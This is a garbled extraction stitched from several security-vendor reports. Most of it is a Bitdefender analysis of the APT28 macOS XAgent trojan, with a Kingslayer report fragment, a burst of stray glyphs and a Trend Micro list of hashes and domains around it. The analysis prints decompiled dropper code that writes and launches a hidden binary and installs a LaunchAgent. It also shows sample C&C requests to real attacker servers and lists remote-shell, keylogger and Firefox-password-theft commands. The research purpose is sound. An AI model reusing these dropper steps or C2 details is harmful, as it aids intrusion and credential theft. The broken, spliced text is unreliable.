\nu\ni\nn\nt\n16\n(\n0\n) \n==\n \n0x5A4\nD and \n$\nv\nal\n0\n and \n$\nv\nen\n0\n}\n15\n \n APPENDIX A: EVENT LOG ANALYZER APPLICATION \nSERVICE EXECUTABLE ANALYSIS\n\nable\n\nable\n\n\n\n\n\n \n\n\n\n\n\n\n\n\nFigure 9 InitCheck() method\nFigure 10 Encoded string\n \n\n\n\n\n \n\n\n\n\n\n\n\nsink hole.\nTable 3 Python String decrypter to decode Kingslayer\u2122s encoded variables\nFigure 13 Beacon matches decrypted URL\n \n\n\n\n\n\n\n\n\n\n\n\n\n\nFigure 14 New thread for beacon\n\n \n\n\nFigure 15 Unpacking method employed to load \ufb01K2\ufb02\nFigure 16 K2 Trojan magic check\n \n\n\ntherefore the console is hidden from the user. \n\n \n\n\n\n\n\n\n\n\n\n\nFigure 18 Alternate URL in Kingslayer backdoor\n\n APPENDIX B: SELECT FORENSIC FINDINGS FROM \nAN ENTERPRISE ADMIN\u2122S MACHINE INFECTED WITH \nKINGSLAYER AND THE K2 SECONDARY MALWARE\n\n\n\n\n\n\n\n\n\n\nTable 6 Suspicious ShimCache entries\n 30\nANALYSIS OF BP.EXE \n\n\n\n\n\n\n\n\n\n\n\n\n\nTable 7 Password dumper\n\n \n\n\n\nPassword to the terminal.\n\n\n \n\nFigure 22 Terminal output of password dumper\nFigure 23 Firefox output\n ", "           BD-Business-Jul.18.2017-Tk#:\ncrea1572\nAll Rights Reserved. \u00a9 2015 Bitdefender. All trademarks, trade names, and products referenced herein are property of their respective owners.  \n \nFOR MORE INFORMATION VISIT: enterprise.bitdefender.com\nBitdefender is a global security technology company that delivers solutions in more than 100 countries through a network of value-added alliances, distributors \nand reseller partners. Since 2001, Bitdefender has consistently produced award-winning business and consumer security technology, and is a leading security \nprovider in virtualization and cloud technologies. Through R&D, alliances and partnership teams, Bitdefender has elevated the highest standards of security \nexcellence in both its number-one-ranked technology and its strategic alliances with the world\u2122s leading virtualization and cloud technology providers. More \ninformation is available at \n \nhttp://www.bitdefender.com/\n ", "Dissecting the APT28 \nMac OS X Payload\n [\n2\n]\nAuthors:\n\u0141\n \nTiberius Axinte, Technical Lead, Antimalware Lab\n\u0141\n \nBogdan Botezatu  - senior e-threat analyst\n [\n3\n]\nA post-mortem analysis of\n \nTrojan.MAC.APT28 - XAgent\n\n\n\n\n\n\n\n\n\n [\n4\n]\nA.\n \nContext\n\n\n\n\n\n\n\nmessages, contacts, voicemail, call history, notes, \ncalendar and Safa\nB.\n \nAttack Flow\n\nPaloAlto\n\n\n\nKomplex Binder\n\n\n  \nv7 \n= \nobjc_msgSend\n(&\nOBJC_CLASS___NSString\n, \ufb01\nstringWithFormat:\ufb02\n, \nCFSTR(\ufb01%@/roskosmos_2015-2025.pdf\ufb02)\n, \nv6\n);\n  \nv8 \n= \nobjc_msgSend\n(&\nOBJC_CLASS___NSString\n, \ufb01\nstringWithFormat:\ufb02\n, \nCFSTR(\ufb01SetFile -a E %@/\nroskosmos_2015-2025.pdf\ufb02)\n, \nv6\n);\n  \nv9 \n= \nobjc_msgSend\n(&\nOBJC_CLASS___NSString\n, \ufb01\nstringWithFormat:\ufb02\n, \nCFSTR(\ufb01rm -rf %@/roskosmos_2015-2025.\napp\ufb02)\n, \nv6\n);\n  \nv10 \n= \nobjc_msgSend\n(\n          &\nOBJC_CLASS___NSString\n,\n          \ufb01\nstringWithFormat:\ufb02\n,\n          \nCFSTR(\ufb01open -a Preview.app %@/roskosmos_2015-2025.pdf\ufb02)\n,\n          \nv6\n);\n  \nv11 \n= \nobjc_msgSend\n(&\nOBJC_CLASS___NSData\n, \ufb01\ndataWithBytes:length:\ufb02\n, &\njoiner\n, 135028LL);\n  \nobjc_msgSend\n(\nv11\n, \ufb01\nwriteToFile:atomically:\ufb02\n, \nCFSTR(\ufb01/tmp/content\ufb02)\n, 1LL);\n  \nv12 \n= (\nconst char *\n)\nobjc_msgSend\n(\nv9\n, \ufb01\nUTF8String\ufb02\n);\n  \nsystem\n(\nv12\n);\n  \nsystem\n(\ufb01\nchmod 755 /tmp/content\ufb02\n);\n  \nv13 \n= \nobjc_msgSend\n(&\nOBJC_CLASS___NSData\n, \ufb01\ndataWithBytes:length:\ufb02\n, &\npdf\n, 1584258LL);\n  \nobjc_msgSend\n(\nv13\n, \ufb01\nwriteToFile:atomically:\ufb02\n, \nv7\n, 1LL);\n  \nv14 \n= (\nconst char *\n)\nobjc_msgSend\n(\nv8\n, \ufb01\nUTF8String\ufb02\n);\n  \nsystem\n(\nv14\n);\n  \nv15 \n= \nobjc_msgSend\n(&\nOBJC_CLASS___NSTask\n, \ufb01\nalloc\ufb02\n);\n  \nv16 \n= \nobjc_msgSend\n(\nv15\n, \ufb01\ninit\ufb02\n);\n  \nobjc_msgSend\n(\nv16\n, \ufb01\nsetLaunchPath:\ufb02\n, \nCFSTR(\ufb01/tmp/content\ufb02)\n);\n  \nobjc_msgSend\n(\nv16\n, \ufb01\nlaunch\ufb02\n);\n  \nobjc_msgSend\n(\nv16\n, \ufb01\nwaitUntilExit\ufb02\n);\n  \nv17 \n= (\nconst char *\n)\nobjc_msgSend\n(\nv10\n, \ufb01\nUTF8String\ufb02\n);\n  \nsystem\n(\nv17\n);\nThe Komplex Binder\n [\n]\n \nKomplex: roskosmos_2015-2025.pdf\n\n Komplex Dropper\n\n\nsystem\n(\ufb01\nmkdir -p /Users/Shared/.local/ &> /dev/null\ufb02\n);\nsystem\n(\ufb01\nmkdir -p ~/Library/LaunchAgents/ &> /dev/null\ufb02\n);\n(\nv5\n, &\n, \nCFSTR(\ufb01\n/Users/Shared/.local/kextd\ufb02\n)\n, 1LL);\n(\nv6\n, &\n, \nCFSTR(\ufb01\n/Users/Shared/com.apple.updates.plist\ufb02\n)\n, 1LL);\n(\nv7\n, &\n, \nCFSTR(\ufb01\n/Users/Shared/start.sh\ufb02\n)\n, 1LL);\nsystem\n(\ufb01\ncp /Users/Shared/com.apple.updates.plist $HOME/Library/LaunchAgents/  &>/dev/null\ufb02\n);\nremove\n(\ufb01\n/Users/Shared/com.apple.updates.plist\ufb02\n);\nsystem\n(\ufb01\nchmod 755 /Users/Shared/.local/kextd\ufb02\n);\nsystem\n(\ufb01\nchmod 755 /Users/Shared/start.sh\ufb02\n);\n\nKomplex Payload\n\n\n\n\nXAgent malware\n\n\nXAgent\n was distributed via \nKomplex\n\n [\n]\nKomplex\nXAgent\nProject path\nkazak\n\nkomplex\nkazak\n\nXAgentOSX\nMalware path \non the infected \nsystem\n\n/.local/\n\n\n/.local/\nC&C\n\nPossible Attack Flow\n [\n7\n]\nC.\n \nInitialization\n\nBootXLoader\n\nrunLoader\n method, which orchestrates the \n\nv29 \n= 1;\nv30 \n= 14;\nv31 \n= 1;\nv32 \n= \ngetpid\n();\nv26 \n= 648LL;\nif ( \nsysctl\n(&\nv29\n, 4u, &\nv27\n, &\nv26\n, 0LL, 0LL) )\n    goto LABEL_13;\n\n  \nv7 \n= \nv2\n;\n  \nv3 \n= 0;\n  \nobjc_retainAutorelease\n(\nCFSTR(\ufb01\n8.8.8.8\ufb02\n)\n);\n  \nv4 \n= \nobjc_msgSend_ptr\n(\nCFSTR(\ufb01\n8.8.8.8\ufb02\n)\n, \nselRef_cStringUsingEncoding_\n, 1LL, \nv7\n);\n  \nv5 \n= \nSCNetworkReachabilityCreateWithName\n(0LL, (\n__int64\n)\nv4\n);\n  \nHIDWORD\n(\nv7\n) = 0;\n  if ( (\nunsigned __int8\n)\nSCNetworkReachabilityGetFlags\n(\nv5\n, (\nchar *\n)&\nv7 \n+ 4) )\n  {\u2013..\n\nHTTPChannel\n\n\n \nhttp_chanel_obj \n= \nobjc_msgSend_ptr\n(\nclassRef_HTTPChannel\n, \nselRef_alloc\n);\n \nv12 \n= \nv10\n(\nhttp_chanel_obj\n, (\nconst char *\n)\nselRef_init\n);\n \nv13 \n= \nv10\n(\nclassRef_NSThread\n, \nselRef_alloc\n);\n \nv14 \n= \nobjc_msgSend_ptr\n(\nv13\n, \nselRef_initWithTarget_selector_object_\n, \nv4\n, \nselRef_postThread_\n, \nv12\n);\n \nobjc_msgSend_ptr\n(\nv14\n, \nselRef_start\n);\n \nv15 \n= \nobjc_msgSend_ptr\n(\nclassRef_NSThread\n, \nselRef_alloc\n);\n \nv16 \n= \nobjc_msgSend_ptr\n(\nv15\n, \nselRef_initWithTarget_selector_object_\n, \nv4\n, \nselRef_getThread_\n, \nv12\n);\n \nobjc_msgSend_ptr\n(\nv16\n, \nselRef_start\n);\n\nMainHandler\n  \nv6 \n= \nobjc_msgSend_ptr\n(\nclassRef_MainHandler\n, \nselRef_alloc\n);\n  \nv7 \n= \nobjc_msgSend_ptr\n(\nv6\n, (\nconst char *\n)\nselRef_init\n);\n  \nv8 \n= \nobjc_retain_ptr\n(\nv5\n, \nselRef_init\n);\n  \nv9 \n= \nv7\n[4];\n  \nv7\n[4] = \nv8\n;\n  \nobjc_release_ptr\n(\nv9\n);\n  \nobjc_msgSend_ptr\n(\nv7\n, \nselRef_cycleLoop\n);\n [\n]\nD.\n \nCommunication\n\n\n\u0141\n \n\n\u0141\n \n\n1. \n \nReceiving commands from C&C server\n\n\n\n\n\n\n\n\n\n\ncmdPacket\n, contains a \ncommand\n\nparameter\n and a \nsize\n\nstruct\n cmdPacket {\nunsigned\n \nchar\n cmd;\nchar\n \n*\nparam;\nunsigned\n \nlong\n \nlong\n param_size;\n};\nCommand Structure\n\ncmdPacket\n\n\nHTTP GET Request\nMethod\n\nServer\nVerbs\n\nArgs\n\nResponse\n(base64)\n Request a command from server\n [\n]\nGET\n http://apple-iclods.org/close/?itwm\n=\nLO6iN\n-\nPjpD0U8AVlLo_Hk3X9FSgAF\n&xzxI4\n=\n9_qwCS03APJT \nHTTP\n/\n1.1\nHost\n: \napple\n-iclods.org\nPragma\n: \nno\n-cache\nConnection\n: \nkeep\n-alive\nAccept\n: \n*/*\nUser\n-\nAgent\n: 4\nfe4b9560e99e33dabca553e2eeee510\n\nCFNetwork\n/\n673.3\n \nDarwin\n/\n13.4.0\n (x86_64)\nAccept\n-\nLanguage\n: \nen\n-us\nAccept\n-\nEncoding\n: \ngzip\nConnection\n: \nkeep\n-alive\n \nExample of GET message\n \n\n\nCommand Value\nCommand char\nModule\nAction\n101\ne\nInfoOS\ngetOsInfo\n102\nf\nInfoOS\ngetProcessList\n103\ng\n\n104\nh\ni\n\n\n107\n\n\nm\n110\nn\nScreenShot\n\n111\no\nScreenShot\nStart screenShotLoop\n112\np\nScreenShot\nStop screenShotLoop\nt\nPassword\ngetFirefoxPassword\n117\nu\n\n\nv\n\nstopOperation\nw\n\n \nC&C Commands and Actions\n\n\nmsgPacket\nstruct\n msgPacket {\n   \n \nint\n agent_id;\n   \n \nshort\n module_id;\n   \n \nunsigned\n \nchar\n cmd_id;\n   \n \nchar\n \n*\ndata_;\n   \n \nunsigned\n \nint\n data_size;\n   \n \nunsigned\n \nchar\n priority;\n};\n \nMessage Structure\n [\n10\n]\n\nKERNEL_CRYPTO_MAIN_KEY\n\nkey\n and a \nDATA_TOKEN\n \nxor-ed\n \n\nbase64\n\nPOST\n\nHTTP POST Request\nMethod\nServer\nBody(base64)\nSend message to server\n\n\nPOST Body  for Hello Message\nagent_id\nmodule_id\n0x3303\ncmd_id\n2\ndata\ndata_size\n0xF\npriority\n     \n     \nPOST\n \nhttp://23.227.196.215/watch/?itwm=7FJcXOPyN_Znh7quXfh4WAaKquNzY\n&oe\n=\n9cu2LRvfab&ags\n=\nPi8KZsjwBh\n&oe\n=\nHXK20P\n&aq\n=\nh2RBWMQI&aq\n=\nyRRTH&i5H\n=\nMKNBXTB\nHost\n: 23.227.196.215\n\nContent\n-\nType\n: \napplication\n/x-www-form-urlencoded; charset\n=\nutf-\n8\nConnection\n: \nkeep\n-alive\nProxy\n-\nConnection\n: \nkeep\n-alive\nAccept\n: \n*/*\n\nUser\n-\nAgent\n: 4\nfe4b9560e99e33dabca553e2eeee510\n (unknown version) \nCFNetwork\n/\n673.3\n \nDarwin\n/\n13.4.0\n (x86_64)\nAccept\n-\nLanguage\n: \nen\n-us\n\nAccept\n-\nEncoding\n: \ngzip\nContent\n-\nLength\n: 81\n \n\n0_a70HpSuFQI7FnNetyKM559SUEcCj-\nWBinNUfTdPQw0ZVTfyNXe26b6isibFp_cJLGqtiOZ9Em3iUA\n==\nExample of Hello Message\n [\n11\n]\nE.\n \nModules\n\n\n1. BootXLoader: \n\n2. MainHandler:  \n\n \n   \n \ncase\n \n\u201ae\u2122\n:\n           \n \ngetInfoOSX\n   \n \ncase\n \n\u201af\u2122\n:\n\n           \n \ngetProcessList\n   \n \ncase\n \n\u201ag\u2122\n:\n\n           \n \nremoteShell\n   \n \ncase\n \n\u201ah\u2122\n:\n\n           \n \ngetInstalledAPP\n   \n \ncase\n \n\u201ai\u2122\n:\n\n           \n \nshowBackupIosFolder\n   \n \ncase\n \n\u201aj\u2122\n:\n\n           \n \ndownloadFileFromPath\n   \n \ncase\n \n\u201ak\u2122\n:\n\n           \n \ncreateFileInSystem\n   \n \ncase\n \n\u201al\u2122\n:\n\n           \n \nexecFile\n \n   \n \n   \n \ncase \n\u201am\u2122\n:\n           \n \ndeletFileFromPath\n   \n \ncase\n \n\u201an\u2122\n:\n\n           \n \ntakeScreenShot\n   \n \ncase\n \n\u201ao\u2122\n:\n\n           \n \nstartTakeScreenShot\n   \n \ncase\n \n\u201ap\u2122\n:\n\n           \n \nstopTakeScreenShot\n   \n \ncase\n \n\u201at\u2122\n:\n\n           \n \ngetFirefoxPassword\n   \n \ncase\n \n\u201au\u2122\n:\n\n           \n \nftpUpload\n   \n \ncase\n \n\u201av\u2122\n:\n\n           \n \nftpStop\n   \n \ncase\n \n\u201aw\u2122\n:\n\n           \n \nreadFiles\n3. HTTPChannel :\n\n-[\nHTTPChannel\n \nenqueue\n:\narray\n:]\n                             \n \n-[\nHTTPChannel\n \ndequeue\n:]\n                                   \n \n-[\nHTTPChannel\n \nclear\n:]\n                                     \n \n-[\nHTTPChannel\n \ngetIntegerFromProcName\n]\n                     \n \n-[\nHTTPChannel\n \ngetAgentID\n]\n                                 \n \n-[\nHTTPChannel\n \ncreateRandomSymbols\n:]\n                       \n \n-[\nHTTPChannel\n \ncreateEncodeToken\n:\nsize_token\n:]\n              \n \n-[\nHTTPChannel\n \ncreateKeyToken\n:]\n                            \n \n-[\nHTTPChannel\n \nrandom\n:\nend\n:]\n                                \n \n-[\nHTTPChannel\n \ngenerateUrlQuestion\n:]\n                       \n \n-[\nHTTPChannel\n \ngenerateHttpMes\n:\ndata_size\n:\nsize_http_mes\n:]\n   \n \n-[\nHTTPChannel\n \ncreateEncodeData\n:\nsize_data\n:\nsize_result_data\n:]\n-[\nHTTPChannel\n \ntakeOutPacket:::\n]\n                           \n \n-[\nHTTPChannel\n \ngenerateUrlParametrs\n:]\n                      \n \n-[\nHTTPChannel\n \nisActiveNetwork\n]\n                            \n \n-[\nHTTPChannel\n \nisActiveChannel\n]\n                            \n \n-[\nHTTPChannel\n \nnextServer\n:]\n                                \n \n-[\nHTTPChannel\n \ntimeoutChanger\n:]\n                            \n \n-[\nHTTPChannel\n \nget\n]\n                                        \n \n-[\nHTTPChannel\n \ngetCryptoRawPacket\n]\n                         \n \n-[\nHTTPChannel\n \npostMessageThread\n]\n                          \n \n-[\nHTTPChannel\n \npost\n]\n                                       \n \n-[\nHTTPChannel\n \ncreateCryptPacket\n]\n                          \n \n-[\nHTTPChannel\n \ncreateDecryptPacket\n:]\n                       \n \n-[\nHTTPChannel\n \nhelloMessage\n]\n    \n [\n12\n]\n4. CameraShot: \n5. Password: \n\n\n-[\nPassword\n \nwriteLogMsg\n:]\n     \n \n-[\nPassword\n \nhtmlLogMessage\n:]\n  \n \n-[\nPassword\n _\ninitNSSLib\n]\n      \n \n-[\nPassword\n \ngetFirefoxPassword\n]\n6. FileSystem: \n\n-[\nFileSystem\n \ngetFileFromDirectory\n:\nsizeFile\n:]\n       \n \n-[\nFileSystem\n \ncreateFile\n:\nbodyFile\n:\nsizeBody\n:]\n        \n \n-[\nFileSystem\n \nexecuteFile\n:]\n                         \n \n-[\nFileSystem\n \ndeleteFile\n:]\n                          \n \n-[\nFileSystem\n \n:\nwithMask\n:\nandRecursion\n:]\n7. FTPManager: \n\n-[\nFTPManager\n \n]\n                                     \n \n-[\nFTPManager\n \ninit\n]\n                                       \n \n-[\nFTPManager\n _\ncheckFMServer\n:]\n                            \n \n-[\nFTPManager\n \n:]\n                                \n \n-[\nFTPManager\n _\ncreateListingArrayFromDirectoryListingData\n:]\n-[\nFTPManager\n _\nuploadData\n:\nwithFileName\n:\ntoServer\n:]\n         \n \n-[\nFTPManager\n \ngetAgentID\n]\n                                 \n \n-[\nFTPManager\n _\nuploadFile\n:\ntoServer\n:]\n                      \n \n-[\nFTPManager\n _\ncreateNewFolder\n:\natServer\n:]\n                 \n \n-[\nFTPManager\n _\ncontentsOfServer\n:]\n                         \n \n-[\nFTPManager\n _\ndownloadFile\n:\ntoDirectory\n:\nfromServer\n:]\n      \n \n-[\nFTPManager\n \nuploadData\n:\nwithFileName\n:\ntoServer\n:]\n8. InjectApp\n\n\n\n\n\n\u0141\n \n\n-[\nInjectApp\n \ninjectRunningApp\n]\n-[\nInjectApp\n \nisInjectable\n:]\n-[\nInjectApp\n \nsendEventToPid\n:]\n9. InfoOS: \n\n10. Keylogger: \n\n-[Keylogger activeAppDidChange:]\n                \n \n-[Keylogger checkAccesibility]\n                  \n \n-[Keylogger checkSpecialKey:]\n                   \n \n-[Keylogger disableLogging]\n                     \n \n-[Keylogger enableLogging]\n                      \n \n-[Keylogger initEventTapAndStartRunLoop]\n-[Keylogger keyPressedeventMonitor]\n             \n \n-[Keylogger sendLog]\n                            \n \n-[Keylogger setAccessibilityApplication]\n        \n \n [\n13\n]\n-[Keylogger setKeyPressedeventMonitor:]\n         \n \n-[Keylogger start]\n                              \n \n-[Keylogger status]\n                             \n \n-[Keylogger stop]\n   \n11. Launcher: \n\n\n\n+[\nLauncher\n \nrandomInteger\n:\nmax\n:]\n      \n \n+[\nLauncher\n \ngenerateRandomPathAndName\n]\n-[\nLauncher\n \nreloadItSelf\n:]\n           \n \n-[\nLauncher\n \ncheckProcessName\n]\n     \n\n\n\n\n\n\n\n\n\n\n\n\n\n\nmwwod\n\npaxs\nerx\nexprd\nfcc\n\nrcp\nsmm\nrtw\nfsg\ntew\n\nnfod\nrwd\nwsat\nnfsrfd\nscpo\nnfd\nFres\nntfs\nQas\nupdate\nrdf\nroutr\nrep\nmnod\nroute\n12. RemoteShell: \n\n-[\nRemoteShell\n \ndispatchCommand\n:]\n         \n \n-[\nRemoteShell\n \nstart\n:]\n                   \n \n-[\nRemoteShell\n \nexecuteShellCommand\n:]\n     \n \n-[\nRemoteShell\n \ngetInstalledApps\n]\n         \n \n-[\nRemoteShell\n \ncheckBackupIosDeviceFolder\n]\n [\n14\n]\n13. Coder:\nCoder\n::b64Decode(char *,uint,uint *,char *)\n     \n \nCoder\n::base64UrlEncode(uchar *,uint,uint *)\n     \n \nCoder\n::b64Encode(uchar *,uint,uint *,char *)\n    \n \nCoder\n::base64Decode(char *,uint,uint *)\n         \n \nCoder\n::base64Encode(uchar *,uint,uint *)\n \n14. Cryptor: \n\nCryptoContainer\n::cryptRc4(uchar *,uint,uint)\n    \n \nCryptoContainer\n::decryptData(uchar *,uint,uint *)\nMac\nLinux\n\n\n\nCameraShot\n\nFMServer\n\n\n\n\nLauncher\nPassword\nScreenShot\nCoder\nCoder\n\n\n \nModules comparison with Linux\n [\n]\nF.\n \nConclusions\n\n\n\n\n\n\n\n \nAll Rights Reserved. \u00a9 2015 Bitdefender. All trademarks, trade names, and products referenced herein are property of their respective owners.  \n \nFOR MORE INFORMATION VISIT: enterprise.bitdefender.com\nBitdefender is a global security technology company that delivers solutions in more than 100 countries through a network of value-added alliances, distributors \nand reseller partners. Since 2001, Bitdefender has consistently produced award-winning business and consumer security technology, and is a leading security \nprovider in virtualization and cloud technologies. Through R&D, alliances and partnership teams, Bitdefender has elevated the highest standards of security \nexcellence in both its number-one-ranked technology and its strategic alliances with the world\u2122s leading virtualization and cloud technology providers. More \ninformation is available at \n \nhttp://www.bitdefender.com/\n ", "                 F\n\u00fa\nH\n\ufb02\n0\n\u2021\n\u00f6\u00f6\ufb02\u00fa\nH\n\u00fb\u00fb\u00fb\n\u00b3\u00b3\n\u2021\u2021\n\u00d1\nl\n\u00b3\u00e2\ufb02\n\u00d2\n      ", "Trend\nLabs\n \n \n \n \n \n TREND MICRO LEGAL DISCLAIMER\n \nThe information provided herein is for general information and educational purposes only. It is not intended and should not b\ne construed to constitute legal \nadvice. The information contained herein may not be \napplicable to all situations and may not reflect the most current situation. Nothing contained herein should \nbe relied on or acted upon without the benefit of legal advice based on the particular facts and circumstances presented and \nnothing herein should \nbe construed \notherwise. Trend Micro reserves the right to modify the contents of this document at any time without prior notice.\n \nTranslations of any material into other languages are intended solely as a convenience. Translation accuracy is not guarantee\nd \nnor implied. If any questions arise \nrelated to the accuracy of a translation, please refer to the original language official version of the document. Any discrep\nancies or differences created in the \ntranslation are not binding and have no legal effect for c\nompliance or enforcement purposes.\n \nAlthough Trend Micro uses reasonable efforts to include accurate and up\n-\nto\n-\ndate information herein, Trend Micro makes no warranties or representations of any \nkind as to its accuracy, currency, or completeness. You agree \nthat access to and use of and reliance on this document and the content thereof is at your own \nrisk. Trend Micro disclaims all warranties of any kind, express or implied. Neither Trend Micro nor any party involved in cre\nating, producing, or delivering this\n \ndocument shall be liable for any consequence, loss, or damage, including direct, indirect, special, consequential, loss of bu\nsiness profits, or special damages, \nwhatsoever arising out of access to, use of, or inability to use, or in connection with the us\ne of this document, or any errors or omissions in the content thereof. \n\n \n \n \n \n \n \n \n \n  \n \n \n \n \nHash\n \nTrend Micro \nDetection\n \n6535696186395b02608f16d86ce9b918e45012a217c11352b9d2904bf6a30c6c\n \nBAT_DLOADER.AUSYSB\n \nab70ef16e625291df6dc33903ec23dbc7b505c25e2e894bfbfd0110550d7664e\n \nBKDR_SCADPRV.G\n \n647b7a619b3ef6fa76b3e710a3f20b78a0a8ab6299b9245a893052d7b94b62fa\n \nac15fe5d369eb2dce9d04207f9ef573250c362df2d8e304747dd8ee68f17ad05\n \nBKDR_SOCKSBOT.B\n \n5f45f9238f17e140b65af93ae072256468c377a39fe0b637fe0c3527627a612c\n \n48a92c81bace0b39ab211f512755ec35176748c6c53437f317d959ae649604c1\n \nBKDR_SOKCSBOT.A\n \nf1a45adcf907e660ec848c6086e28c9863b7b70d0d38417dd05a4261973c955a\n \nBKDR_XRAT.JCT\n \n92be93ec4cbe76182404af0b180871fbbfa3c7b34e4df6745dbcde480b8b4b3b\n \nBKDR_XRAT.KVJ\n \n684523927a468ed5abea8f6c0d3dc01210ec38aa4e0a533abc75dc891d3b0400\n \na34d60d00ac67e8ccce6c5b969e86e969272af2e2479e17b5bfd0b25650504c4\n \ne5af968a8eca77ac64862db3f6c92d7d64db24a999d0ded30f272f2a220cdb70\n \n260fa4d0680272feb537aac722466e58eb26c5de2ac858c10d3a244655544313\n \nd9cdaa649b7ca7b9f61121d269801dbbd68551488c8423ae3a3e95233d6ee99d\n \nTROJ_ARTIEF.EVV\n \n889f1f6873a090162356109f0f3984c044094ea789028ec3e20ba2238d269160\n \n0aeda32f977c98c8160491358491d0ad0898dcaa3366bde60c0a3bf8541e7b3f\n \nTROJ_DDEX.SM\n \nde22772c655890a73c7fe13d6cff49b1a560d19df04271e4bc3adcd5402158c9\n \nBKDR_DISMONN.A\n \nf2c6effbbb203d5889f75b7d445f1a0f73c479e4a977fd7da3bd923f5b827762\n \nTROJ_DLOADER.JEJOWJ\n \na6abfb56c25c06c5c12c08a8098f427fd0da11c5930a02ebb51ebc117ff63b1a\n \nTROJ_DLOADR.AUSUGF\n \n283e3e8a651b87e055944e9b132f087f88181331bec1194f354eccf085d1bfe2\n \nTROJ_DROPPR.DAM\n \n34399b371c44e52dbd17c6b4e46619f7c7131af20f66fd7a2c7f92c081d78276\n \nb6e9a1ab662304ad11ffca314fcf3d29bf7bd8cb2ff06d9b9727eaed576384b6\n \nbc8e469ac8515a23a3073a41099fde8420b8a40bb71abaf965c9031bd0a084e3\n \n7535cf27ca99f8f77c8ae918ca07e8365289f27d252283444b1e6a5dd8bf087b\n \nTROJ_FUERY.A\n \n10112aab7bc43c9c138aad9b75ed6a69d7305ea2f04b5cfaa14ecfcddfaa4c7a\n \n0345ecfb3b26acc072a3a423a9bc6aafe8750e65234e5d1f820c07cb61a2fcaf\n \nTROJ_GENOME.VIDK\n \n145551d6ad9f6e6d825393342561407f9f663a43471bb1738f741addf4dd6d82\n \ne4f66bd9eb1cb01f103c9a0b0616c3b073c658c1248f0e0f6faa06a629d7b06d\n \nbf94a8f82f9b3ec1ad36be72a27813a661654bc5215559bf10b9eddfd49021b4\n \nTROJ_HTALINK.C\n \n7d6fa3046a4e558b2ef40ae0a96001a50eb3fcaed9b00e4d7bd235d1d83be01a\n \nTROJ_MDROP.YYSOW\n \na0c9b6a77dd3e6738a9f5c1a6704adeef904831d29392cf2c24a5628afecf563\n \n  \n \n \n \n \nHash\n \nTrend Micro \nDetection\n \n4fbfc64623700615410ec2caba6b931494990e1c0b210d76819edc95a8d1d8b4\n \nTROJ_MDROP.YYSRE\n \ne80a97b02bf9c43b8d288097caa38ab85a03ec1f8dbbc7cced1198274f60f6f6\n \n4c8202aa414622c84a6fe32bb0402c30de964e84dcffef452e830c6f3b6c8467\n \n667992e8c195664ad87fed3e715f0a52efe79a7c83f67d031c3a1affc6411e5f\n \n328d98944555f83357c099208c3be597f5a0af0c05a3384dfbd419822177ad08\n \n8a6a2027099e8a4d68f4c9931a8050b89aa587f8de47244af4ff399dfc0930a2\n \nTROJ_MDROP.YYSRG\n \n72d71b91ceb7dda82db0ec8ca3aba476d01b1011057ae71425e34fa31af2ee6b\n \ndfc469d0cca07e83e58c6266dcd6ac67c5d5dacd6c6ef2543b3ebbbf6d35a280\n \nTROJ_SELFDEL.TT\n \nd0d63189a28406914d9d49e8164dc716326f849cd35195ad56bb7e7ea0196ad8 \n \nTROJ_VAGGER.B\n \ndfe0e2cad843ee66f7bad85e62accb76ae54993eb057041e6f81315a3c99d522\n \nTROJ_VAGGER.C\n \nf24546590ad97b60b3c99a0bcacea4e405ba3884b57393ecf47b3463c8936a45\n \nTROJ_XRAT.JCT\n \n801b101bc935ae3c4a8b9bf964ddc30fc5132da2271a23b9727f2b78187c62b4\n \n244d8dccd179a94b91e51f94be1e8ace42835b5b204e94e3f77f52dc866d8209\n \nae5ecf3889c4bb1838cca1b644c16cb32e815fc1e2fd0db96aa6ca6fffbf30b6\n \nTSPY_SKEEYAH.LNH\n \ncf7adf8ed9b779e62f603a2f23af72671eb331e79586c46b75bd95644a62039a\n \n4a21f18ec5e65b77a9c826991d6c51c45001d2b013d317096fb5f1417da88d74\n \n7317867ee5207f6b7195930d0ec3938130cbd2dc00adc8ba0cd3eca7114f4b26\n \nVBS_DLOADR.YYSUJ\n \nb43bd22295f8287e5f8126712f0db11afe8b2bdaf918ed361c0d0865125a585b\n \nW2KM_DLOADE.PUTY\n \n0c09c662699c507c553317a909665952562bd7e2434c4a719470f672bdada700\n \nW2KM_DLOADE.VQZTP\n \n48b68a5ab219d7917dbe818e00ddbae889cf8655faf02639e4a3fbe4e46ef9b2\n \nf0766afdaf89181401b1cbcf012f8e3bf7af8dde10f11407e23ad867e1b2922a\n \n3dd9814aeae5530e514915c6f73125188a692d0df2e56788c4302cb63d406e03\n \n0cddd9288e87db957b3517ac201f2da309e782a8f127d49e1dec2c7a7312d911\n \nc1227e575553f06fca469d43d02eda006033e5d88acb9b516f5ba64c030772b1\n \nTROJ_MDROP.YYSRH\n \n72d71b91ceb7dda82db0ec8ca3aba476d01b1011057ae71425e34fa31af2ee6b\n \nc1227e575553f06fca469d43d02eda006033e5d88acb9b516f5ba64c030772b1\n \n90218e24be373a8a8a3452d5da59d551a3b1936e7c3210cc9cb83995be3d2030\n \nTROJ_MDROP.YYSRG\n \n647b7a619b3ef6fa76b3e710a3f20b78a0a8ab6299b9245a893052d7b94b62fa\n \nBKDR_SCADPRV.G\n \n47e0886ba064156d7914db02dec46fa8f497b20373c7f2d4bc8f3f13bd8fa455\n \nBKDR_SCADPRV.I\n \nab608d1adb169040b6fad2029ae56c07fa8d45ee9e03f4b9dfebce2b7d92b1d4\n \n  \n \n \n \n \nDomain/\nURL\n \nhxxp://\nbdarmy[.]news\n \nhxxp://\nbrokings[.]org\n \nhxxp://\nciis[\n-\n]cn[.]net\n \nhxxp://\nclep[\n-\n]cn[.]org\n \nhxxp://\ncnaas[.]org\n \nhxxp://\ncpcnews[\n-\n]cn[.]com\n \nhxxp://\ncrazywomen[\n-\n]dating[.]com\n \nhxxp://\ndwnnews[.]net\n \nhxx\np://euuwebmail\n[\n.\n]\ncom\n \nhxxp://\ngffbzbgov[\n-\n]cn[.]org\n \nhxxp://\ngloalfirepower[.]org\n \nhxxp://\ngooglemail[.]support\n \nhxxp://\ngooglmail[.]cloud\n \nhxxp://\nifenngnews[.]com\n \nhxxp://\niisdp[.]org\n \nhxxp://\ninvitingholes[.]com\n \nhxxp://\nloweinstitute[.]org\n \nhxxp://\nmfagov[\n-\n]cn[.]com\n \nhxxp://\nmileastday[\n-\n]cn[.]com\n \nhxxp://\nmilitarypeoplecn[.]com\n \nh\nxx\np://militaryreviews\n[\n.\n]\nnet\n \nhxxp://\nmilstar[\n-\n]cn[.]com\n \nhxxp://\nneteease[.]com\n \nhxxp://\npla[\n-\n]report[.]net\n 